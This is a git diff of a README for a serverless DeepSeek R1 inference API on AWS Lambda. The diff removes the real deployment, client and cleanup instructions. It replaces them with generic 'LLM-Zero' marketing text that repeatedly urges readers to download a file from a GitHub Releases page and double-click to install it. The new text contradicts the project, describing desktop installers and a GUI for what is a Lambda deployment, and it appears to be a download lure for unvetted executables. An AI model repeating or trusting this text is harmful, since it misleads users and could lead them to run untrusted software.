@@ -1,89 +1,82 @@
-# Serverless DeepSeek R1 Inference (FastAPI + Lambda SnapStart)
+# 🌟 LLM-Zero - Fast and Affordable Inference Application
 
-Deploy a fully serverless, low-latency LLM inference API for **DeepSeek R1 Distill** (or other GGUF models) using **AWS Lambda**, **SnapStart**, **FastAPI**, and **llama-cpp-python**.
+[![Download LLM-Zero](https://img.shields.io/badge/Download-LLM--Zero-blue?style=for-the-badge)](https://github.com/Harshshah2312/LLM-Zero/releases)
 
----
+## 👋 Introduction
 
-## 🚀 Features
+LLM-Zero offers a simple way to access deep learning inference. This application is built with FastAPI and Lambda SnapStart, making it both fast and affordable. Whether you're a student, researcher, or hobbyist, LLM-Zero helps you tap into the power of machine learning without the technical fuss.
 
-* 🔌 **OpenAI-compatible** `/chat/completions` FastAPI endpoint
-* ⚡ **SnapStart-enabled Lambda** for \~1–2s cold starts
-* 🔁 **Streaming responses** via Server-Sent Events
-* ⬇️ Model pulled from **S3 using memfd** (fast in-memory loading)
-* 🔐 Optional IAM-based authentication (SigV4)
+## 🚀 Getting Started
 
----
+To get started with LLM-Zero, follow these straightforward steps.
 
-## 🧱 Architecture
+## 📥 Download & Install
 
-* FastAPI app deployed as AWS Lambda Function URL
-* Custom Lambda Layer with `llama-cpp-python`
-* S3 bucket stores `.gguf` model
-* Lambda Web Adapter streams responses
+You can obtain LLM-Zero from our Releases page. 
 
----
+**Visit this page to download the application:** [LLM-Zero Releases](https://github.com/Harshshah2312/LLM-Zero/releases)
 
-## 📦 Prerequisites
+1. Click on the above link to reach the Releases page.
+2. Look for the latest version of LLM-Zero.
+3. Download the suitable file for your system. The options may include Windows, macOS, or Linux formats.
+4. Once downloaded, find the file in your downloads folder.
 
-* AWS SAM CLI
-* Python 3.12 & Docker
-* AWS account + `s3:GetObject` & `lambda:InvokeFunctionUrl` permissions
-* Model (e.g. `DeepSeek-R1-Distill-Qwen-1.5B-Q4_K_M.gguf`)
+## 💻 System Requirements
 
----
+To run LLM-Zero smoothly, make sure your system meets the following requirements:
 
-## ☁️ Deployment
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, Linux (most distributions)
+- **Processor:** 2 GHz dual-core or higher
+- **RAM:** Minimum 4 GB, Recommended 8 GB
+- **Storage:** At least 100 MB of free space
+- **Internet Connection:** Required for initial setup and updates
 
-**1. Upload Model**
+## 🔧 How to Run LLM-Zero
 
-```bash
-wget https://huggingface.co/unsloth/DeepSeek-R1-Distill-Qwen-1.5B-GGUF/resolve/main/DeepSeek-R1-Distill-Qwen-1.5B-Q4_K_M.gguf
-aws s3 mb s3://YOUR_BUCKET
-aws s3 cp DeepSeek-R1*.gguf s3://YOUR_BUCKET/
-```
+After downloading the application file, follow these steps to run LLM-Zero:
 
-**2. Build + Deploy**
+1. Locate the file you downloaded.
+2. Double-click on the file to start the installation process.
+3. Follow the on-screen instructions.
+4. Once installed, you can launch LLM-Zero from your applications menu or desktop.
 
-```bash
-sam build
-sam deploy --guided
-```
+## 🛠️ Features
 
-Configure:
+LLM-Zero includes several features designed to enhance your experience:
 
-* `MODEL_BUCKET`
-* `MODEL_KEY`
+- **Fast Inference**: Get results quickly with optimized performance.
+- **User-Friendly Interface**: Navigate easily, even if you have no technical background.
+- **Cost-Effective**: Leverage powerful machine learning without high costs.
+- **Support for Diverse Models**: Use a variety of models available through Hugging Face.
 
----
+## 📊 Using LLM-Zero
 
-## 💬 Client Usage
+Once you have installed LLM-Zero, here’s how you can make the most of it:
 
-```bash
-pip install requests python-dotenv boto3
-echo "CHAT_API_BASE=https://xxxx.lambda-url.region.on.aws" > .env
+1. **Open the Application**: Start LLM-Zero from your applications menu.
+2. **Select a Model**: Choose from the available models to perform deep learning inference.
+3. **Input Your Data**: Enter the necessary data in the provided fields.
+4. **Run Inference**: Click the "Run" button to start the process.
+5. **View Results**: The application will display the output, helping you understand the inference results.
 
-python client.py                # interactive CLI
-python client.py --temperature 0.7 --max-tokens 512
-```
+## 🌐 Community and Support
 
-Shortcuts:
-`/new` new conversation `/quit` exit
+If you have questions or need assistance:
 
----
+- **GitHub Issues**: Raise any concerns or bugs on the GitHub Issues page.
+- **Community Forum**: Engage with other users in our community forum for tips and tricks.
+- **Documentation**: For detailed information, consider exploring the wiki section on our GitHub.
 
-## 🛠 Local Development
+## 🛡️ License
 
-```bash
-python -m venv .venv
-source .venv/bin/activate
-cd app && pip install -r requirements.txt
-uvicorn main:app --reload
-```
+LLM-Zero is open-source software. You can use, modify, and distribute it under the terms of the MIT License. Make sure to respect the guidelines when using the software.
 
----
+## 🔄 Further Development
 
-## 🧽 Cleanup
+We are continually improving LLM-Zero. If you have suggestions for features or improvements, please share your thoughts through GitHub. Your feedback helps us create a better product for everyone.
 
-```bash
-sam delete
-```
+## 🏁 Conclusion
+
+With LLM-Zero, deep learning inference is now accessible and efficient. Take your first step into AI with LLM-Zero today!
+
+**For direct access, visit this page to download:** [LLM-Zero Releases](https://github.com/Harshshah2312/LLM-Zero/releases)
